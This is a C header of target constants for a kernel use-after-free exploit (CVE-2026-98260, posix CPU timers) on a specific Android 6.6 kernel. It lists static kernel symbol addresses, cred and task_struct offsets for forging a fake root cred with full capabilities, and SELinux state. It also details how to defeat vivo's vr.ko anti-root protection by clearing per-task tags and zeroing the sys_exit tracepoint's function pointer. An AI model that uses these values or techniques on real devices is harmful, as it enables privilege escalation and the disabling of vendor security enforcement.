#ifndef TARGET_H
#define TARGET_H

/*
 * CVE-2026-98260 (posix cpu timers UAF) exploit target values
 * Kernel: 6.6.127-android15-8-ga8e7fdfdc746-ab16003472-4k
 *
 * All _STATIC addresses are link-time (KASLR slide = 0), extracted from the
 * matching vmlinux (kallsyms + BTF + disasm). Add g_slide at runtime.
 *
 * STATIC_TIMER_SITE / COPY_PROCESS_LOW21 are kmem_cache_alloc call-site
 * addresses (ftrace call_site / _RET_IP_), not plain symbols:
 *   STATIC_TIMER_SITE  = do_timer_create + 0xa8  (k_itimer alloc, posix_timers_cache)
 *   COPY_PROCESS_LOW21 = copy_process   + 0x140 (task_struct alloc, task_struct_cachep)
 */

/* do_timer_create call site of the k_itimer kmem_cache_alloc (BTF/disasm). */
#define STATIC_TIMER_SITE   0xffffffc080195bb4ULL
#define TIMER_SITE_LOW21    0x195bb4ULL
#define TIMER_ALLOC         0x108ULL

/* cred_jar: sizeof(struct cred) and the kmem_cache_alloc bytes_alloc. */
#define CRED_REQ            0xb8ULL
#define CRED_ALLOC          0xc0ULL

/* Link-time addresses (kallsyms) and BTF field offsets. */
#define SELINUX_STATE_STATIC  0xffffffc08237a0e8ULL
#define PANIC_ON_WARN_STATIC  0xffffffc08212ac0cULL
#define CRED_UID_OFF          0x8ULL

/* task_struct / cred layout (BTF). */
#define OFF_TASK_CRED       0x820ULL
#define COPY_PROCESS_LOW21  0xab8bcULL
#define TASK_ALLOC_BYTES    0x12c0ULL
#define FULLCAP             0x1ffffffffffULL

/* Link-time symbols for the fake cred's refcounted sub-objects. */
#define ROOT_USER_STATIC    0xffffffc08214efe0ULL
#define INIT_USER_NS_STATIC 0xffffffc08214ed50ULL
#define INIT_UCOUNTS_STATIC 0xffffffc082150ab0ULL
#define INIT_GROUPS_STATIC  0xffffffc082150540ULL
#define SELINUX_BLOB_OFF    0x0ULL
#define SELINUX_SID_KERNEL  1U

/* vivo vr.ko anti-root per-task tag.
 * vr.ko tags every shell/app-origin task (commit_creds probe) with two marker
 * bytes + a syscall-tracepoint work bit; its sys_exit probe kills the task the
 * moment it runs with euid/fsuid 0. Clear both tag bytes on the child's task
 * before direct cred patching so it is no longer under vr.ko enforcement.
 * Offsets recovered from vr.ko disassembly (PD2405) -- VERIFY on I2401 by
 * reading task+0x06 and task+0x2c of a shell task (should be 1 when tagged). */
#define VR_TAG_A_OFF        0x06ULL
#define VR_TAG_B_OFF        0x2cULL

/* vivo vr.ko global kill-path disable: zero the funcs pointer of
 * __tracepoint_sys_exit, whose iterator NULL-checks funcs (verified in the
 * reference disassembly: cbz x21 after the load), unlike the rvh commit_creds
 * iterator. This stops vr's sys_exit termination probe for every task --
 * including the KernelSU helper tasks spawned later. Static address from the
 * matching vmlinux kallsyms; struct tracepoint.funcs is at offset 0x48 (BTF). */
#define TP_SYS_EXIT_STATIC   0xffffffc0822d35a0ULL
#define TRACEPOINT_FUNCS_OFF 0x48ULL

#endif /* TARGET_H */
